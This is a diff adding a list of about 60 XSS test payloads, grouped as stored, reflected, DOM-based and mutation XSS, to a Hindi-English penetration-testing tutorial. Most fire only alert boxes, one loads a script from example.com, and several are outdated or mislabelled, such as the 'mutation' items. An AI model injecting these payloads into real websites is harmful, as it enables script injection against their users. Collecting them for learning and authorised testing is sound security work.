@@ -62,3 +62,96 @@ Browser Developer Tools
 
 7. Conclusion:
 XSS बहुत ही common vulnerability है, लेकिन अगर हम थोड़ी सी सावधानी रखें और secure coding करें, तो इससे आसानी से बचा जा सकता है। एक Penetration Tester के लिए यह बहुत जरूरी है कि उसे XSS के basics अच्छे से पता हों, तभी वो रियल वर्ल्ड में इसका सही इस्तेमाल कर सकता है।
+
+
+
+
+
+# XSS Payloads Collection (Dummy Examples)
+
+यहाँ Cross-Site Scripting (XSS) के चार प्रमुख प्रकारों के लिए लगभग 60 डमी payloads दिए गए हैं।  
+ये payloads आप टेस्टिंग और समझने के लिए इस्तेमाल कर सकते हैं।
+
+---
+
+## 1. Stored XSS Payloads (20 Examples)
+
+1. `<script>alert('Stored XSS 1')</script>`  
+2. `<img src=x onerror=alert('Stored XSS 2')>`  
+3. `<svg/onload=alert('Stored XSS 3')>`  
+4. `<body onload=alert('Stored XSS 4')>`  
+5. `<iframe src="javascript:alert('Stored XSS 5')"></iframe>`  
+6. `<input autofocus onfocus=alert('Stored XSS 6')>`  
+7. `<div style="width: expression(alert('Stored XSS 7'));">Test</div>`  
+8. `<marquee onstart=alert('Stored XSS 8')>XSS</marquee>`  
+9. `<video src onerror=alert('Stored XSS 9')></video>`  
+10. `<object data="javascript:alert('Stored XSS 10')"></object>`  
+11. `<a href="javascript:alert('Stored XSS 11')">Click me</a>`  
+12. `<form action="javascript:alert('Stored XSS 12')"><input type=submit></form>`  
+13. `<link rel="stylesheet" href="javascript:alert('Stored XSS 13')">`  
+14. `<style>@import 'javascript:alert("Stored XSS 14")';</style>`  
+15. `<details open ontoggle=alert('Stored XSS 15')>Details</details>`  
+16. `<label for=x onmouseover=alert('Stored XSS 16')>Hover me</label>`  
+17. `<button onclick=alert('Stored XSS 17')>Click</button>`  
+18. `<span tabindex="0" onfocus=alert('Stored XSS 18')>Focus me</span>`  
+19. `<canvas onmousemove=alert('Stored XSS 19')></canvas>`  
+20. `<textarea oninput=alert('Stored XSS 20')></textarea>`
+
+---
+
+## 2. Reflected XSS Payloads (15 Examples)
+
+1. `"><script>alert('Reflected XSS 1')</script>`  
+2. `"><img src=x onerror=alert('Reflected XSS 2')>`  
+3. `"><svg/onload=alert('Reflected XSS 3')>`  
+4. `"><body onload=alert('Reflected XSS 4')>`  
+5. `"><iframe src="javascript:alert('Reflected XSS 5')"></iframe>`  
+6. `"><input autofocus onfocus=alert('Reflected XSS 6')>`  
+7. `"><div style="width: expression(alert('Reflected XSS 7'));">Test</div>`  
+8. `"><marquee onstart=alert('Reflected XSS 8')>XSS</marquee>`  
+9. `"><video src onerror=alert('Reflected XSS 9')></video>`  
+10. `"><object data="javascript:alert('Reflected XSS 10')"></object>`  
+11. `"><a href="javascript:alert('Reflected XSS 11')">Click me</a>`  
+12. `"><form action="javascript:alert('Reflected XSS 12')"><input type=submit></form>`  
+13. `"><link rel="stylesheet" href="javascript:alert('Reflected XSS 13')">`  
+14. `"><style>@import 'javascript:alert("Reflected XSS 14")';</style>`  
+15. `"><details open ontoggle=alert('Reflected XSS 15')>Details</details>`
+
+---
+
+## 3. DOM-Based XSS Payloads (15 Examples)
+
+1. `<script>document.body.innerHTML='<img src=x onerror=alert("DOM XSS 1")>';</script>`  
+2. `<img src=x onerror=alert("DOM XSS 2")>`  
+3. `<svg/onload=alert('DOM XSS 3')>`  
+4. `<body onload=alert('DOM XSS 4')>`  
+5. `<iframe src="javascript:alert('DOM XSS 5')"></iframe>`  
+6. `<input autofocus onfocus=alert('DOM XSS 6')>`  
+7. `<div style="width: expression(alert('DOM XSS 7'));">Test</div>`  
+8. `<marquee onstart=alert('DOM XSS 8')>XSS</marquee>`  
+9. `<video src onerror=alert('DOM XSS 9')></video>`  
+10. `<object data="javascript:alert('DOM XSS 10')"></object>`  
+11. `<a href="javascript:alert('DOM XSS 11')">Click me</a>`  
+12. `<form action="javascript:alert('DOM XSS 12')"><input type=submit></form>`  
+13. `<link rel="stylesheet" href="javascript:alert('DOM XSS 13')">`  
+14. `<style>@import 'javascript:alert("DOM XSS 14")';</style>`  
+15. `<details open ontoggle=alert('DOM XSS 15')>Details</details>`
+
+---
+
+## 4. Mutation XSS Payloads (10 Examples)
+
+1. `<div><xss></xss></div><script>alert('Mutation XSS 1')</script>`  
+2. `<body onreset=alert('Mutation XSS 2')>`  
+3. `<input type="image" src="javascript:alert('Mutation XSS 3')">`  
+4. `<img src="#" onerror=alert('Mutation XSS 4')>`  
+5. `<meta http-equiv="refresh" content="0;url=javascript:alert('Mutation XSS 5')">`  
+6. `<script type="text/javascript">document.body.innerHTML='<img src=x onerror=alert("Mutation XSS 6")>';</script>`  
+7. `<object type="text/x-scriptlet" data="http://example.com/xss.js"></object>`  
+8. `<div onmouseover=alert('Mutation XSS 7')>Hover me</div>`  
+9. `<svg><script>alert('Mutation XSS 8')</script></svg>`  
+10. `<details ontoggle=alert('Mutation XSS 9')>Details</details>`
+
+---
+
+*Updated by मनोज — Penetration Tester & Cybersecurity Enthusiast*
